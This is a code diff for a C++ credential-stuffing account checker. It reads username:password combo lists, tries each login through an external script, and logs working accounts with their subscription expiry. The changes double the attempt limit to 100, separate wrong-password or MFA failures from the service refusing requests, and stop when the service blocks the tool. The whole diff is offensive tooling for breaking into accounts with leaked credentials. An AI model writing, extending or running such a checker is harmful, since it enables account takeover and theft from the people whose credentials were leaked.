@@ -9,11 +9,14 @@
 #define TEMPFILE ".tempfile.txt"
 #define SCRIPT "./script.sh"
 #define BUFLEN 50
-#define LIMIT 50
+#define LIMIT 100
+#define STATUS_SUCCESS 0
+#define STATUS_FAILURE 1
+#define STATUS_API_REFUSED 2
 using namespace std;
 
 void parseCombo(const string& combo, string& username, string& password);
-bool checkStatus(void);
+int checkStatus(void);
 string getExpiry(void);
 
 int main(int argc, char* argv[])
@@ -52,8 +55,8 @@ int main(int argc, char* argv[])
 
     string combo, username, password;
 
-    int count{0};
-    while(count < LIMIT && !ifile.eof())
+    int count{1};
+    while(count <= LIMIT && !ifile.eof())
     {
         getline(ifile, combo);
         parseCombo(combo, username, password);
@@ -79,24 +82,29 @@ int main(int argc, char* argv[])
 	cerr << "[DEBUG]: CPID Before Wait: " << rpid << '\n';
 	#endif
 
-	cout << "Checking:\t" << combo << '\n';
+	cout << count << ": Checking:\t" << combo << flush;
         pid_t cpid = wait(nullptr);
 
 	#ifdef __DEBUG
 	cerr << "[DEBUG]: CPID By Wait: " << cpid << '\n';
 	#endif
 	
-        bool status = checkStatus();
-        if(status)
+        int status = checkStatus();
+        if(status == STATUS_SUCCESS)
         {
             string expiry = getExpiry();
             ofile << combo << "\t|\tExpiry: " << expiry << endl;
-            cout << "[SUCCESS]: " << combo << "\t|\tExpiry: " << expiry << '\n';
+            cout << "\t[SUCCESS]:" << "\tExpiry: " << expiry << '\n';
         }
-        else
+        else if(status == STATUS_API_REFUSED)
         {
-            cout << "[FAILURE]: " << combo << '\n';
+            cout << "\t[FAILURE]:\t[API REFUSED TO SERVE REQUEST]\n";
+	    return -1;
         }
+	else
+	{
+		cout << "\t[FAILURE]:\tWrong Credentials OR MFA\n";
+	}
 
         count++;
     }
@@ -128,7 +136,7 @@ void parseCombo(const string& combo, string& username, string& password)
     return ;
 }
 
-bool checkStatus(void)
+int checkStatus(void)
 {
     string line;
     ifstream tempfile{TEMPFILE};
@@ -145,10 +153,14 @@ bool checkStatus(void)
 	#endif
 
         if(line.find("Welcome") != string::npos)
-            return true;
+            return STATUS_SUCCESS;
+	else if(line.find("It's not") != string::npos)
+		return STATUS_API_REFUSED;
+
+
     }
 
-    return false;
+    return STATUS_FAILURE;
 }
 
 string getExpiry(void)
